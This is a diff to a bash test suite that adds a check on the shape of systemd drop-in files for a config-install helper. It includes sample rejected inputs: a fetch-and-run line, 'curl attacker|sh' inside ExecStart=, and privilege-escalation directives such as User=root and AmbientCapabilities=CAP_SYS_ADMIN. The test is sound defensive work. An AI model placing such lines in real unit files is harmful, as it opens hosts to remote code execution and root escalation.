@@ -217,9 +217,13 @@ test_all_managed_dests_accepted() {
     # systemd EnvironmentFiles and the helper now refuses anything that is not KEY=VALUE, so
     # feeding them the generic 'payload-<base>' blob would fail for a reason that has nothing
     # to do with the allowlist this test is about.
+    # #7103 R2 — same reasoning for *.service.d/*.conf: the drop-in shape gate refuses anything
+    # outside {blank, comment, [Service], Environment=, EnvironmentFile=}, and the generic blob
+    # is none of those. Shape-appropriateness is a precondition of THIS test, not its subject.
     case "$d" in
-      /etc/default/*) payload="KEY_FOR_$(basename "$d" | tr -c '[:alnum:]' '_')=value" ;;
-      *)              payload="payload-$(basename "$d")" ;;
+      /etc/default/*)                          payload="KEY_FOR_$(basename "$d" | tr -c '[:alnum:]' '_')=value" ;;
+      /etc/systemd/system/*.service.d/*.conf)  payload=$'[Service]\nEnvironmentFile=-/etc/default/soleur-doppler-token\n' ;;
+      *)                                       payload="payload-$(basename "$d")" ;;
     esac
     printf '%s' "$payload" | bash "$HELPER" "$d" "$mode" "$owner" 2>/dev/null || rc=$?
     [[ "$rc" == "$RC_OK" ]] && accepted=$((accepted + 1))
@@ -284,6 +288,86 @@ test_dropin_dir_created() {
     echo "  FAIL: drop-in file missing at ${TEST_DESTDIR}${d}"
     FAIL=$((FAIL + 1))
   fi
+  teardown
+}
+
+# --- #7103 R2 3.1: drop-in shape guard (the security precondition of the restart grant) ---
+# Until #7103 the content gate was scoped to /etc/default/* only, so the three *.service.d/*.conf
+# dests were installed with NO validation at all. That was inert precisely because nothing
+# root-restarted those units; 3.2 adds `sudo systemctl try-restart` for exactly them. systemd
+# merges drop-ins AFTER the unit body, so an unvalidated drop-in on vector.service (which runs
+# User=deploy) could set User=root, reset-and-replace ExecStart=, or add AmbientCapabilities= —
+# turning a *delivery* capability into an *execution* capability on the one host with no
+# replacement path. webhook.service omits NoNewPrivileges, so this gate is the only boundary
+# on that path. Hence: gate first, grant second.
+#
+# Both directions are asserted. A guard that rejects everything would pass every negative arm
+# below and brick the credential delivery this whole incident exists to fix.
+test_dropin_shape_guard() {
+  echo "TEST: install — *.service.d/*.conf payload shape is enforced"
+  setup
+  local d="/etc/systemd/system/vector.service.d/10-vector-doppler-token.conf"
+  local mode="644" owner="root:root" rc
+
+  # (a) POSITIVE CONTROL FIRST — the real payload must still install. Asserted before the
+  # negatives so a blanket-reject implementation cannot masquerade as a working gate.
+  rc=0
+  printf '# managed by infra-config-apply\n[Service]\nEnvironmentFile=-/etc/default/soleur-doppler-token\n' \
+    | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
+  assert_eq "well-formed drop-in (comment + [Service] + EnvironmentFile=) is accepted" "$RC_OK" "$rc"
+
+  # (b) Environment= (the inline sibling of EnvironmentFile=) is also permitted.
+  rc=0
+  printf '[Service]\nEnvironment=DOPPLER_PROJECT=soleur\n' \
+    | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
+  assert_eq "Environment= directive is accepted" "$RC_OK" "$rc"
+
+  # (c) NEGATIVE, one arm per forbidden directive named in the plan. Each is a distinct
+  # escalation primitive, so each gets its own assertion rather than one representative case.
+  local forbidden bad_rc
+  for forbidden in \
+    'ExecStart=/bin/sh -c "curl attacker|sh"' \
+    'User=root' \
+    'AmbientCapabilities=CAP_SYS_ADMIN' \
+    'NoNewPrivileges=false'
+  do
+    bad_rc=0
+    printf '[Service]\n%s\n' "$forbidden" \
+      | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || bad_rc=$?
+    assert_eq "drop-in carrying '${forbidden%%=*}=' is rejected" "$RC_REJECTED" "$bad_rc"
+  done
+
+  # (d) The rejection names the reason with its count, so a denial is diagnosable from the
+  # handler's per-file accounting without SSH.
+  rc=0
+  HELPER_ERR=$(printf '[Service]\nUser=root\nExecStart=/bin/false\n' \
+    | bash "$HELPER" "$d" "$mode" "$owner" 2>&1 1>/dev/null) || rc=$?
+  assert_contains "rejection reason is dropin_shape with a bad-line count" "$HELPER_ERR" "dropin_shape:bad_lines=2"
+
+  # (e) REFUSE-TO-INSTALL, not install-then-fail: a rejected payload must leave the previous
+  # (good) drop-in byte-intact rather than a partially-written or clobbered file. This is the
+  # property that makes the gate safe to put in front of a live delivery path.
+  local before after
+  before=$(sha256sum "${TEST_DESTDIR}${d}" | awk '{print $1}')
+  printf '[Service]\nUser=root\n' | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || true
+  after=$(sha256sum "${TEST_DESTDIR}${d}" | awk '{print $1}')
+  assert_eq "rejected drop-in left the previously-installed file unmodified" "$before" "$after"
+
+  # (f) SCOPE: the gate must not leak onto the script dests. A /usr/local/bin payload is a shell
+  # script whose every line would be a "forbidden directive" under the drop-in grammar; if the
+  # dest match were widened (e.g. to all of /etc/systemd/system/*) delivery would stop dead.
+  rc=0
+  printf '#!/bin/bash\nexec /usr/bin/env true\n' \
+    | bash "$HELPER" "/usr/local/bin/ci-deploy.sh" "755" "root:root" >/dev/null 2>&1 || rc=$?
+  assert_eq "shape gate does not apply to script dests" "$RC_OK" "$rc"
+
+  # (g) The unit-body dest /etc/systemd/system/webhook.service is NOT a drop-in and carries a
+  # full unit (ExecStart= included). It must remain installable — the gate keys on the
+  # *.service.d/*.conf shape, never on "lives under /etc/systemd/system".
+  rc=0
+  printf '[Unit]\nDescription=webhook\n[Service]\nExecStart=/usr/bin/webhook\n' \
+    | bash "$HELPER" "/etc/systemd/system/webhook.service" "644" "root:root" >/dev/null 2>&1 || rc=$?
+  assert_eq "shape gate does not apply to full unit bodies" "$RC_OK" "$rc"
   teardown
 }
 
@@ -376,6 +460,7 @@ test_reject_dest_symlink
 test_all_managed_dests_accepted
 test_envfile_shape_guard
 test_dropin_dir_created
+test_dropin_shape_guard
 test_reject_sudoers_dest
 test_reject_setuid_mode
 test_reject_owner_seize
